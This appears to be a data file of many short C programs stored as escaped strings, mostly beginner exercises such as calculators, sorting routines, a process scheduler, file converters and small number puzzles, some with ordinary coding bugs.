    "#include<stdio.h>\nint N(int,int,int,long long []);\nint M(int,int,int,long long []);\nint main()\n{\n int n,K,l,r;\n long long a[100010],H[100010];\n scanf(\"%d %d\",&n,&K);\n for(int i=0;i<n;i++)\n {\n  scanf(\"%lld\",&a[i]);\n }\n for(int i=0;i<K;i++)\n {\n   scanf(\"%d %d\",&l,&r);\n   int p=N(n,l,r,a);\n   int q=M(n,l,r,a);\n   int s,t;\n   s=(p>q)?q:p;\n   t=(p>q)?p:q;\n   H[i]=a[s];\n for(int k=s+1;k<=t;k++)\n   {\n  H[i]=H[i]^a[k];\n   }\n }\n for(int i=0;i<K;i++)\n printf(\"%lld\\n\",H[i]);\n return 0;\n}\nint N(int n,int l,int r,long long a[])\n{\n long long ans=0;\n for(int i=l;i<=r;i++)\n {\n ans=ans+a[i];\n }\n return ans%n;\n}\nint M(int n,int l,int r,long long a[])\n{\n long long ans=1;\n for(int i=l;i<=r;i++)\n {\n  ans=ans*a[i]%n;\n }\n return ans;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nvoid find1()\n{\n int number = 16;\n do\n {\n  if ((number % 10) == 6)\n  {\n   int newNumber = (number / 10) + (int) pow(10, (int) log10(number)) * 6;\n   printf(\"%d -> %d\\n\", number, newNumber);\n   if ((number * 4) == newNumber)\n   {\n    printf(\"%d !!!\\n\", number);\n    break;\n   }\n  }\n  number++;\n } while (1);\n}\nvoid find2()\n{\n int number;\n for (number = 11; number <= 9999999; number++)\n {\n  double root = pow(number, 0.5);\n  if (fabs(root - (double) (int) root) < 0.00001)\n  {\n   int tempNumber = number;\n   int length = (int) log10(number) + 1;\n   int digits[length];\n   int i;\n   for (i = 0; i < length; i++)\n   {\n    digits[i] = tempNumber % 10;\n    tempNumber /= 10;\n   }\n   int match = 1;\n   for (i = 0; i < length / 2; i++)\n   {\n    if (digits[i] != digits[length - i - 1])\n    {\n     match = 0;\n     break;\n    }\n   }\n   if (match == 1)\n   {\n    printf(\"%7d,  %4d, reverse\\n\", number, (int) root);\n   }\n  }\n }\n}\nint main(void)\n{\n find2();\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n   int m, n;\n   do {\n      printf(\"Unesite broj iz intervala [4, 10] > \");\n      scanf(\"%d\", &m);\n   } while (m < 4 || m > 10);\n   do {\n      printf(\"Unesite broj iz intervala [2, 8] > \");\n      scanf(\"%d\", &n);\n   } while (n < 2 || n > 8);\n   return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n      int burst_time[20], process[20], waiting_time[20], turnaround_time[20], priority[20];\n      int i, j, limit, sum = 0, position, temp;\n      float average_wait_time, average_turnaround_time;\n      printf(\"Enter Total Number of Processes:\\t\");\n      scanf(\"%d\", &limit);\n      printf(\"\\nEnter Burst Time and Priority For %d Processes\\n\", limit);\n      for(i = 0; i < limit; i++)\n      {\n            printf(\"\\nProcess[%d]\\n\", i + 1);\n            printf(\"Process Burst Time:\\t\");\n            scanf(\"%d\", &burst_time[i]);\n            printf(\"Process Priority:\\t\");\n            scanf(\"%d\", &priority[i]);\n            process[i] = i + 1;\n      }\n      for(i = 0; i < limit; i++)\n      {\n            position = i;\n            for(j = i + 1; j < limit; j++)\n            {\n                  if(priority[j] < priority[position])\n                  {\n                        position = j;\n                  }\n            }\n            temp = priority[i];\n            priority[i] = priority[position];\n            priority[position] = temp;\n            temp = burst_time[i];\n            burst_time[i] = burst_time[position];\n            burst_time[position] = temp;\n            temp = process[i];\n            process[i] = process[position];\n            process[position] = temp;\n      }\n      waiting_time[0] = 0;\n      for(i = 1; i < limit; i++)\n      {\n            waiting_time[i] = 0;\n            for(j = 0; j < i; j++)\n            {\n                  waiting_time[i] = waiting_time[i] + burst_time[j];\n            }\n            sum = sum + waiting_time[i];\n      }\n      average_wait_time = sum / limit;\n      sum = 0;\n      printf(\"\\nProcess ID\\t\\tBurst Time\\t Waiting Time\\t Turnaround Time\\n\");\n      for(i = 0; i < limit; i++)\n      {\n            turnaround_time[i] = burst_time[i] + waiting_time[i];\n            sum = sum + turnaround_time[i];\n            printf(\"\\nProcess[%d]\\t\\t%d\\t\\t %d\\t\\t %d\\n\", process[i], burst_time[i], waiting_time[i], turnaround_time[i]);\n      }\n      average_turnaround_time = sum / limit;\n      printf(\"\\nAverage Waiting Time:\\t%f\", average_wait_time);\n      printf(\"\\nAverage Turnaround Time:\\t%f\\n\", average_turnaround_time);\n      return 0;\n}",
    "#include <stdio.h>\nfloat sum (float i, float j){\n   return i + j;\n}\nvoid greet(int i){\n  printf(\"Hello %d!\\n\",i);\n}\nint main()\n{\n   int a = 2031;\n   greet(a);\n   int b = 1012;\n   greet(b);\n   printf(\"Enter two float numbers separated by ##: \");\n   float x,y;\n   scanf(\"%f##%f\",&x,&y);\n   float su= sum(x,y);\n   printf( \"%f + %f = %f\\n\", x,y, su);\n   return 0;\n}",
    "#include<stdio.h>\nint main(){\nfloat n1,n2,oper;\nprintf(\"digite  dois numeros\\n\");\nscanf(\"%f \\n%f\",&n1,&n2);\nprintf(\"\\nDIGITE UM NUMERO PARA ESCOLHER UMA DAS SEGUINTES OPERACOES\\n[1] soma (+) \\n[2] subtracao (-) \\n[3] multiplicacao (*) \\n[4] divisao  (/)\\n\");\nscanf(\"%f\",&oper);\nif(oper>4 && oper < 1){\n    printf(\"erro\");\n}\nif(oper==1){\n    printf(\"%.0f + %.0f = %.0f\\n\",n1,n2,n1+n2);\n}else{\n    if(oper==2){\n        printf(\"%.0f - %.0f = %.0f\\n\",n1,n2,n1-n2);\n    }else{\n        if(oper==3){\n            printf(\"%.0f x %.0f = %.0f\\n\",n1,n2,n1*n2);\n        }else{\n            if(oper==4){\n                printf(\"%.2f / %.2f = %.2f\\n\",n1,n2,n1/n2);\n            }\n        }\n    }\n}\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void) {\n  fprintf((stdout), \"This should be printed to standard output\\nwhich can be redirected.\\n\");\n  FILE * tty = fopen(\"/dev/tty\", \"w\");\n  fprintf(tty,\n          \"This should be printed to the controlling tty\\nno matter if the standard output is \"\n          \"redirected.\\n\");\n  fclose(tty);\n  return 0;\n}",
    "int N;\n#pragma parameter N 8 16\nint main()\n{\n    int i, j, a[N], b[N];\n#pragma scop\n    for (;;) {\n for (j = 0; j < N; ++j)\n     a[j] = 0;\n for (j = 0; j < N; ++j)\n     b[j] = a[j];\n    }\n#pragma endscop\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\n\n\n\n\nvoid printer(const char * buffer,\n             const int len) {\n    fprintf((stdout), \"\\n\\nPrinting (%d) elements...\\n\", len);\n    for (int i = 0; i < len; i++) {\n        fprintf((stdout), \"0x%02X \", buffer[i]);\n    }\n    fprintf((stdout), \"\\nPrinting finished.\\n\\n\");\n}\nint main(int argc,\n         char * argv[]) {\n    int lh_count = 1;\n    int hm = 1;\n    char line[1024 + 1];\n    char matrix[10][10 + 1] = { \"###  #####\\0\", \"####  ####\\0\", \"########  \\0\", \"  ########\\0\", \"######  ##\\0\",\n                                          \"###  #####\\0\", \"####  ####\\0\", \"########  \\0\", \"  ########\\0\", \"######  ##\\0\" };\n    int enable_heigth_test = -1;\n    if (enable_heigth_test == 0) {\n        char hMatrixTester[3][10 + 1] = { \"ABCDEFGHIJ\\0\" , \"KLMNOPRSTU\\0\", \"VXZWX12345\\0\" };\n        printf(\"Heigth: (%d)\\n\", 5);\n        for (int i = 0; i < 3; i++) {\n            for (int j = 0; j < 10; j+=5) {\n                int h = j + 5;\n                if (h > 10)\n                    h -= h - 10;\n                for (; h > j ; h--) {\n                    fprintf((stdout), \"i(%d) j(%d) h-1(%d) (%c)\\n\", i, j, (h-1), hMatrixTester[i][h-1]);\n                }\n                fprintf((stdout), \"\\n\");\n            }\n            fprintf((stdout), \"\\n\");\n        }\n        return 0;\n    }\n    memset(line, 0, sizeof(line));\n    for (int i = 0; i < 10; i++)\n        fprintf((stdout), \"%s\\n\", matrix[i]);\n    printf(\"Elements: (%d)\\nHeight: (%d)\\n\", 10, 5);\n    for (int i = 0; i < 10; i++) {\n        for (int j = 0; j < 10; j+=5) {\n            int h = j + 5;\n            if (h > 10)\n                h -= h - 10;\n            for (; h > j ; h--) {\n                fprintf((stdout), \"matrix[%d][%d] = %c\\n\", i, h-1, matrix[i][h-1]);\n                if (matrix[i][h-1] == '#') {\n                    fprintf((stdout), \"matrix[%d][%d] - line: 0x%02X mult: 0x%02X result: 0x%02X\\n\",i ,j , line[h], hm, (line[h] | hm));\n                    line[h] = line[h] | hm;\n                }\n            }\n        }\n        printf(\"\\n\");\n        if (lh_count < 5) {\n            lh_count++;\n            hm *= 2;\n            continue;\n        }\n        printer(line, 10);\n        lh_count = 1;\n        hm = 1;\n        memset(line, 0, sizeof(line));\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nstatic char *help= \"usage: dust <fasta file>\\n  -w <int>   window size [11]\\n  -t <float> threshold [1.1]\\n  -n         mask with Ns (lowercase default)\\n  -h         this message\";\n\n\n\n\n\nint main(int argc, char *argv[]) {\n int opt;\n int window = 11;\n double threshold = 1.1;\n int lowercase = 1;\n while ((opt = getopt(argc, argv, \"w:t:nh\")) != -1) {\n  switch (opt) {\n   case 'w':\n    window = atoi(optarg);\n    break;\n   case 't':\n    threshold = atof(optarg);\n    break;\n   case 'n':\n    lowercase = 0;\n    break;\n   case 'h':\n    fprintf((stderr), \"%s\\n\", help);\n    exit(1);\n  }\n }\n printf(\"window %d, threshold %f, lowercase %s\\n\", window, threshold,\n  lowercase ? \"yes\" : \"no\");\n for (int i = optind; i < argc; i++) {\n  printf(\"positional: %s\\n\", argv[i]);\n }\n}",
    "#include <stdio.h>\ndouble PIE(double e){\n double n = 0;\n double t = 4/(2*n + 1);\n double pi = 0;\n while(t>e){\n  pi += (int)n%2 == 0 ? t : - t;\n  n ++;\n  t = 4/(2*n + 1);\n }\n return pi;\n}\nint main() {\n    double e;\n    scanf(\"%lf\", &e);\n    printf(\"pi = %.8f\", PIE(e));\n    return 0;\n}",
    "int printf(const char *, ...);\nstatic int foo;\nstatic int max(int a, int b) {\n return a + b;\n}\n\n\n\nint main(void) {\n int b = (1 + foo);\n int c = (1 + max(1, (1 + foo)));\n int d = (1 + max(1, (2 + max(1, (1 + foo)))));\n int e = ((1 + foo) + 3 + max(1, ((1 + foo) + max(1, (1 + foo) - 2))))\n\n\n\n  + (1 + foo);\n return printf(\"%d, %d, %d, %d\\n\", b, c, d, e);\n}",
    "#include<stdio.h>\nint main()\n{\n    int i,n,x,a=0,b=0;\n    scanf(\"%d\", &n);\n    for (i=1; i<=n; i++)\n    {\n        scanf(\"%d\", &x);\n        if(x>=10 && x<=20)\n            a++;\n        else\n            b++;\n    }\n    printf(\"%d in\\n\",a);\n    printf(\"%d out\\n\", b);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int i;\n    int n=1;\n    float x,y;\n    while(n=1){\n        scanf(\"%f %f\",&x,&y);\n        if(y!=0){\n              printf(\"%f\\n\",x/y);\n        }\n        else{\n         printf(\"divisao impossivel\\n\");\n        }\n    }\nreturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint Debug = 0;\n\n\n\n\n\n\n\nint process (int i, int j)\n{\n    int val = 0;\n                                        ;\n    val = i * j;\n                                ;\n    return val;\n}\nint main(int argc, char * argv[])\n{\n    int arg1 = 0;\n    int arg2 = 0;\n    if (argc > 2)\n    {\n        Debug = atoi(argv[1]);\n        arg1 = atoi(argv[2]);\n    }\n    if (argc == 4)\n        arg2 = atoi(argv[3]);\n                                                  ;\n                                                  ;\n    printf(\"%i\\n\", process(arg1, arg2));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint compare_two_integers(const void *a, const void *b);\nint main()\n{\n    int random_numbers[100];\n    srand((unsigned int) time(((void*)0)));\n    for (int i = 0; i < 100; i++)\n        random_numbers[i] = rand() % 10 + 1;\n    qsort(random_numbers, 100, sizeof *random_numbers, compare_two_integers);\n    for (int i = 0; i < 100; i++) {\n        printf(\"%02d \", random_numbers[i]);\n        if (i % 10 == 9) putchar('\\n');\n    }\n    return 0;\n}\nint compare_two_integers(const void *a, const void *b)\n{\n    int *pa = (int *)a, *pb = (int *)b;\n    return *pb - *pa;\n}",
    "#include <stdio.h>\nint main(void){\n int n, m;\n  printf(\"Please enter two integers\\n\");\n scanf(\"%d%d\", &n, &m);\n printf(\"Decimal:%u, %u\\n\",n,m);\n printf(\"Hexadecimal:%x, %x\\n\",n,m);\n printf(\"Octal:%o, %o\\n\",n,m);\n return 0;\n}",
    "#include<stdio.h>\n\n\nint main ( void ) {\n int i;\n int responses[40] = {\n  1, 2, 3, 4, 5, 6, 7, 8, 9 ,10,\n  1, 2, 3, 4, 5, 6, 7, 8, 9 ,10,\n  1, 2, 3, 4, 5, 6, 7, 8, 9 ,10,\n  1, 2, 3, 4, 5, 6, 7, 8, 9 ,10,\n };\n int frequency[11] = { 0 };\n for(i = 0; i < 40; i++) {\n  frequency[ responses[i] ]++;\n }\n for(i = 1; i < 11; i++) {\n  printf(\"frequencia das notas %d - %d\\n\", i, frequency[i]);\n }\n}",
    "#include <stdio.h>\n\nint main(){\n    printf(\"Quadrati perfetti fino %d\\n\",10);\n    for (int i=1;i<10;i++){\n        printf(\"%d\\n\",i*i);\n    }\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nvoid StringToHex(char *str, unsigned char *out)\n{\n    char *p = str;\n    char high = 0, low = 0;\n    int tmplen = strlen(p), cnt = 0;\n    tmplen = strlen(p);\n    while(cnt < (tmplen / 2))\n    {\n        high = ((*p > '9') && ((*p <= 'F') || (*p <= 'f'))) ? *p - 48 - 7 : *p - 48;\n        low = (*(++ p) > '9' && ((*p <= 'F') || (*p <= 'f'))) ? *(p) - 48 - 7 : *(p) - 48;\n        out[cnt] = ((high & 0x0f) << 4 | (low & 0x0f));\n        p ++;\n        cnt ++;\n    }\n    if(tmplen % 2 != 0) out[cnt] = ((*p > '9') && ((*p <= 'F') || (*p <= 'f'))) ? *p - 48 - 7 : *p - 48;\n}\nint main(int argc,char *argv[])\n{\n    int i = 0;\n    long len = 0, ret = 0;\n    char *filepath = argv[1];\n    FILE *fp0,*fp1;\n    char *str = ((void*)0);\n    char *str1,*token,*saveptr1;\n    unsigned char out = 0;\n    fp0 = fopen(filepath, \"r+\");\n    if(!fp0){\n        printf(\"open input file:%s failed\\n\",filepath);\n        fclose(fp0);\n        return -1;\n    }\n    fp1 = fopen(\"./out.bin\", \"w+\");\n    if(!fp1){\n        printf(\"open output file failed\\n\");\n        fclose(fp1);\n        return -1;\n    }\n    fseek(fp0, 0, (2));\n    len = ftell(fp0);\n    fseek(fp0, 0, (0));\n    printf(\"input file size:%ld\\n\",len);\n    str = (char*)malloc(len);\n    if(!str){\n        printf(\"malloc failed\\n\");\n        fclose(fp0);\n        fclose(fp1);\n        return -1;\n    }\n    ret = fread(str, len, 1, fp0);\n    if(!ret){\n        printf(\"read input file failed\\n\");\n    }\n    str1 = str;\n    while(*str1 != '\\0'){\n        if((*str1 == '0') && ((*(str1+1) == 'x') || (*(str1+1) == 'X'))){\n            *str1 = 'x';\n            str1 = str1+2;\n        }\n        else\n            str1++;\n    }\n    for(str1 = str; ;str1 = ((void*)0)){\n        token = strtok_r(str1, \",xX\", &saveptr1);\n        if(token){\n            StringToHex(token,&out);\n            ret = fwrite(&out, 1, 1, fp1);\n            if(!ret){\n                printf(\"write out file failed\\n\");\n                goto exit;\n            }\n        }\n        else\n            break;\n    }\n    printf(\"transform complete\\n\");\nexit:\n    free(str);\n    fclose(fp0);\n    fclose(fp1);\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<time.h>\nvoid printInorder(int* arr,int start,int end)\n{\n if(start > end)\n    return;\n  printInorder(arr, start*2 + 1, end);\n  printf(\"%d\\t\", arr[start]);\n  printInorder(arr, start*2 + 2, end);\n}\nvoid buildTree(int* arr,int start,int end,int*,int,int,int);\nint main(int argc, char const *argv[])\n{\n int N = 1024;\n int arr[N];\n int tree[N];\n int i;\n int turns = 1;\n int children =4;\n int store[children][N];\n clock_t cpu_start = clock();\n for(;turns<=children;turns++)\n {\n int offset = (turns-1)*N;\n buildTree(arr,0,N,tree,0,offset,N);\n printInorder(tree,0,N-1);\n }\n clock_t cpu_finish = clock();\n printf(\"\\ntime elapsed in traversing is = %d millisecinds\\n\",(cpu_finish - cpu_start) );\n return 0;\n}\nvoid buildTree(int* arr,int start,int end,int* tree,int k,int offset,int N)\n{\n if(start<=end && k<=N-1){\n int mid = (end+start+1)/2;\n tree[k] = mid+offset;\n buildTree(arr,start,mid-1,tree, k*2+1,offset,N);\n buildTree(arr,mid+1,end,tree,k*2+2,offset,N);\n}\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <stdlib.h>\n#include <string.h>\nint main() {\n int fd1,fd2,s;\n fd2=open(\"foo2.txt\", (0x10000000) | (((__wasi_oflags_t)(1 << 0)) << 12));\n pid_t pid;\n pid=fork();\n char *c = (char *) calloc(100, sizeof(char));\n if(pid==0) {\n  printf(\"\\n\\nHello from the child process!!!!!!!!!!!\\n\\n\");\n   write(fd2,\"Hello world child process\\n\",strlen(\"Hello world child process\\n\"));\n }\n   else if(pid>0) {\n   printf(\"\\n\\nHello from the parent process!!!!!!!!!!!\\n\\n\");\n      write(fd2,\"Hello world parent process\\n\",strlen(\"Hello world parent process\\n\"));\n      close(fd2);\n   }\n}",
    "#include<stdio.h>\nint main(){\n    int num01, num02;\n    printf(\"############# CALCULADORA ###################\\n \\n\");\n    printf(\"Digite o 1o numero: \");\n    scanf(\"%i\", &num01);\n    printf(\"Digite o 2o numero: \");\n    scanf(\"%i\", &num02);\n    printf(\"\\n \\n\");\n    printf(\" A Soma de %i + %i = %i \\n \", num01, num02, num01 + num02);\n    printf(\"A Subtracao de %i + %i = %i \\n \", num01, num02, num01 - num02);\n    printf(\"A Multiplicacao de %i + %i = %i \\n \", num01, num02, num01 * num02);\n    printf(\"A Divisao de %i + %i = %i \\n \", num01, num02, num01 - num02);\n}",
    "#include <limits.h>\nint main() {\n  unsigned long int a = (2147483647 *2U +1U)/2;\n  signed long int b = (2147483647 *2U +1U)/2;\n  unsigned long int res = 0;\n  int error = __builtin_uaddl_overflow(a,b,&res);\n  if (res != 4294967294) {\n    goto ERROR;\n  }\n  if (error) {\n    ERROR:\n    return 1;\n  }\n  return 0;\n}",
    "#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    int fd, result;\n    size_t size;\n    char resstring[14];\n    char name[]=\"one.pipe\";\n    if((fd = open(name, (0x04000000))) < 0)\n    {\n        printf(\"Can\\'t open FIFO for reading\\n\");\n        exit(-1);\n    }\n    size = read(fd, resstring, 14);\n    if(size < 0)\n    {\n        printf(\"Can\\'t read string\\n\");\n        exit(-1);\n    }\n    printf(\"%s\\n\",resstring);\n    close(fd);\n    return 0;\n}",
    "#include <stdio.h>\nint gx = 5;\nint prim(void)\n{\n int i;\n if(gx == 0 || gx == 1)\n  return 0;\n else if(gx == 2)\n  return 1;\n for(i = 2; i < gx; ++i){\n  if(gx % i == 0)\n   return 0;\n }\n return 1;\n}\nint main(void)\n{\n printf(\"%i\\n\", prim());\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int n,i;\n scanf(\"%d\", &n);\n int ar[n];\n for(i=1;i<=n;i++)\n {\n  scanf(\"%d\",&ar[i]);\n }\n for(i=n;i>0;i--)\n {\n  printf(\"%d\\n\", ar[i]);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nint main()\n{\n    int random_number = 0;\n    int input_number = 0;\n    int guess_counter = 0;\n    int guess_left = 0;\n    time_t t;\n    srand((unsigned) time(&t));\n    random_number = rand() % 21;\n    printf(\"Guess a number from 0 to 20: \");\n    for (guess_counter=0; guess_counter<5; ++guess_counter)\n    {\n        scanf(\"%d\", &input_number);\n        if (random_number == input_number)\n        {\n            printf(\"Corect!\\n\");\n            break;\n        }\n        else if (input_number < random_number && input_number > -1)\n            printf(\"Too low!\\n\");\n        else if (input_number > random_number && input_number < 21)\n            printf(\"Too high!\\n\");\n        else\n            printf(\"Error input\\n\");\n        guess_left = 5 - guess_counter - 1;\n        if (guess_counter < 4)\n            printf(\"%d tr%s left. Try again: \", guess_left,\n                                                guess_left == 1 ? \"y\": \"ies\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\nint main()\n{\n char name[256];\n double salary, sales;\n scanf(\"%s %lf %lf\", name, &salary, &sales);\n printf(\"TOTAL = R$ %.2lf\\n\", salary + sales * 0.15);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n   char name[500], lastName[500], id[500],isEmpty[500];\n   int cont=1;\n   FILE * pFile;\n   pFile = fopen (\"data.csv\", \"r\");\n   while(!feof(pFile))\n   {\n       if(cont %250 == 0)\n       {\n           system(\"pause\");\n       }\n       cont++;\n       fscanf(pFile, \"%[^,],%[^,],%[^,],%[^\\n]\\n\", id, name, lastName,isEmpty);\n       printf(\"%s - %s, %s - %s\\n\", id, name, lastName, isEmpty);\n   }\n   fclose(pFile);\n   return(0);\n}",
    "#include <stdio.h>\nint main() {\n    int pascal[100][100] = {};\n    int i, j;\n    pascal[0][0] = 1;\n    for(i = 1; i < 100; i++) {\n        pascal[i][0] = 1;\n        for(j = 1; j <= i; j++) {\n            pascal[i][j] = pascal[i-1][j]+pascal[i-1][j-1];\n        }\n    }\n    int tt, n, t, p;\n    scanf(\"%d\", &tt);\n    while(tt--) {\n        scanf(\"%d %d %d\", &n, &t, &p);\n        if(t < n*p)\n            puts(\"0\");\n        else\n            printf(\"%d\\n\", pascal[t-n*p+n-1][n-1]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n printf(\"ni%cos \\n\",164);\n printf(\"ni%cos\",165);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int i,countt=0;\n    float a[10];\n    for(i=0;i<6;i++){\n        scanf(\"%f\",&a[i]);\n        if(a[i]>0)\n            countt++;\n    }\n    printf(\"%d valores positivos\\n\",countt);\n    return 0;\n}",
    "#include <stdio.h>\nvoid swap_quant(int a,int b){\n    a += b;\n    b = a-b;\n    a -= b;\n}\nvoid selection_sort(int* v, int n){\n int i, j, min, aux;\n for (i = 0; i < (n-1); i++){\n  min = i;\n  for (j = (i+1); j < n; j++){\n   if(v[j] < v[min])\n    min = j;\n  }\n  if (v[i] != v[min]){\n            v[i] += v[min];\n            v[min] = v[i]-v[min];\n            v[i] -= v[min];\n  }\n }\n}\nint main(){\n int n, i;\n scanf(\"%d\", &n);\n int v[n];\n for(i=0; i<n; i++){\n  scanf(\"%d\", &v[i]);\n }\n getchar();\n selection_sort(v,n);\n for(i=0; i<n; i++){\n        printf(\"%d\\n\", v[i]);\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\nlong long int square_sum(long long int n)\n{\n    long long int sum = 0;\n    for(int i = 1;i <= n;i++)\n    {\n        sum += i*i;\n    }\n    return sum;\n}\nint main()\n{\n    while(1)\n    {\n        long long int n;\n        scanf(\"%lld\",&n);\n        if(n == 0) break;\n        else printf(\"%lld\\n\",square_sum(n));\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\ndouble getInputdoubleValue(char text[]) {\n        char s[100];\n        int n;\n        double rv;\n        do {\n        printf(\"%s\", text);\n        fgets(s, 100, (stdin));\n        n=sscanf(s, \"%lf\", &rv);\n    } while (n != 1);\n    return rv;\n}\ndouble getPositiveDoubleInputValue (char text[]) {\n        double f1;\n        do {\n            f1 = getInputdoubleValue(text);\n        } while (f1 < 0);\n        return f1;\n}\ndouble calcForce (double fx, double fy) {\n        double fresultierend = sqrt(fx * fx + fy * fy);\n        return fresultierend;\n}\nint main() {\n        double fx = getPositiveDoubleInputValue(\"fx: \");\n        double fy = getPositiveDoubleInputValue(\"fy: \");\n        double ergebnis = calcForce(fx, fy);\n        printf(\"Ergebniss: %.2lf\\n\", ergebnis);\n        return 0;\n}",
    "#include <math.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(void) {\n  char dateUS[15];\n  char dateCH[15];\n  printf(\"Enter date in US format: \");\n  scanf(\"%s\", dateUS);\n  int day = 0;\n  int month = 0;\n  int year = 0;\n  sscanf(dateUS, \"%i/%i/%i\", &month, &day, &year);\n  sprintf(dateCH, \"%i.%i.%i\", day, month, year);\n  printf(\"Date in CH format: %s \\n\", dateCH);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\nint main() {\n int counter_even_values = 0, counter_odd_values = 0;\n int counter_positive_values = 0, counter_negative_values = 0;\n int value, number_of_inputs;\n for(number_of_inputs = 1; number_of_inputs <= 5; number_of_inputs++) {\n  scanf(\"%d\", &value);\n  _Bool isEven = (value%2 == 0);\n  _Bool isPositive = (value > 0);\n  _Bool isNegative = (value < 0);\n  if(isPositive)\n   counter_positive_values++;\n  if(isNegative)\n   counter_negative_values++;\n  if(isEven)\n   counter_even_values++;\n  else\n   counter_odd_values++;\n }\n printf(\"%d valor(es) par(es) \\n\", counter_even_values);\n printf(\"%d valor(es) impar(es) \\n\", counter_odd_values);\n printf(\"%d valor(es) positivo(s) \\n\", counter_positive_values);\n printf(\"%d valor(es) negativo(s) \\n\", counter_negative_values);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[])\n{\n    unsigned char buffer[512];\n    char jpegName[8];\n    int jpegCounter = 0;\n    if (argc != 2)\n    {\n        printf(\"Usage: ./recover filename\");\n        return 1;\n    }\n    char *infile = argv[1];\n    FILE *inptr = fopen(infile, \"r\");\n    FILE *outptr = ((void*)0);\n    if (inptr == ((void*)0))\n    {\n        printf(\"Could not open file\\n\");\n        return 2;\n    }\n    while (fread(buffer, sizeof(buffer), 1, inptr))\n    {\n        if (buffer[0] == 0xff && buffer[1] == 0xd8 && buffer[2] == 0xff && (buffer[3] & 0xf0) == 0xe0)\n        {\n            if (((void*)0) != outptr)\n            {\n                fclose(outptr);\n                outptr = ((void*)0);\n            }\n            sprintf(jpegName, \"%03d.jpg\", jpegCounter);\n            outptr = fopen(jpegName, \"wb\");\n            if (outptr == ((void*)0))\n            {\n                printf(\"Could not open output file\\n\");\n                return 3;\n            }\n            fwrite(buffer, sizeof(buffer), 1, outptr);\n            jpegCounter++;\n        }\n        else if (((void*)0) != outptr)\n        {\n            fwrite(buffer, sizeof(buffer), 1, outptr);\n        }\n    }\n    if (((void*)0) != outptr)\n    {\n        fclose(outptr);\n    }\n    if (((void*)0) != inptr)\n    {\n        fclose(inptr);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n  char text[6] = \"hello\";\n  fprintf((stdout), \"%s\\n\", text);\n  exit(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\n#include <time.h>\n\nfloat geometrica(int n, float *v)\n{\n float p = 1.0f;\n for (int i = 0; i < n; i++) {\n  p *= v[i];\n }\n if (p < 0) {\n  printf(\"Erro: raiz com radicando negativo: %f\\n\", p);\n  return 0;\n }\n return powf(p, 1. / n);\n}\nint main(void)\n{\n float gn, v[10];\n srand(time(((void*)0)));\n for (int i = 0; i < 10; i++) {\n  v[i] = rand() % 100;\n  printf(\"%.2f \", v[i]);\n }\n puts(\"\");\n gn = geometrica(10, v);\n printf(\"Gn = %2.f\\n\", gn);\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n int i=0;\n unsigned long long f1=2;\n unsigned long long f2=1;\n while(i<100){\n  printf(\"%llu\\n%llu\\n\", f1,f2);\n  f1=f1+f2;\n  f2=f1+f2;\n  i+=2;\n }\n return 0;\n}",
    "#include <stdio.h>\nvoid print_byte(char end_byte) {\n unsigned char byte;\n int pot, k, i;\n byte = (unsigned char ) end_byte;\n pot = 128;\n for ( i = 0; i < 8; i++ ) {\n  k = byte / pot;\n  if ( k > 0 ) {\n   printf(\"1\");\n   byte %= pot;\n  } else printf(\"0\");\n  pot = pot / 2;\n }\n}\nvoid print_bytes(const void * end_byte, int n) {\n int i;\n unsigned char * c = (unsigned char *) end_byte;\n for ( i = 0; i < n; i++ ) {\n  print_byte( *(c + i) );\n  printf(\" \");\n }\n}\nint main() {\n unsigned char ch;\n unsigned short sh;\n unsigned int in;\n float fl;\n double db;\n scanf(\"%lf\", &db);\n ch = sh = in = fl = db;\n print_bytes(&ch, sizeof(ch)); printf(\"\\n\");\n print_bytes(&sh, sizeof(sh)); printf(\"\\n\");\n print_bytes(&in, sizeof(in)); printf(\"\\n\");\n print_bytes(&fl, sizeof(fl)); printf(\"\\n\");\n print_bytes(&db, sizeof(db)); printf(\"\\n\");\n return 0;\n}",
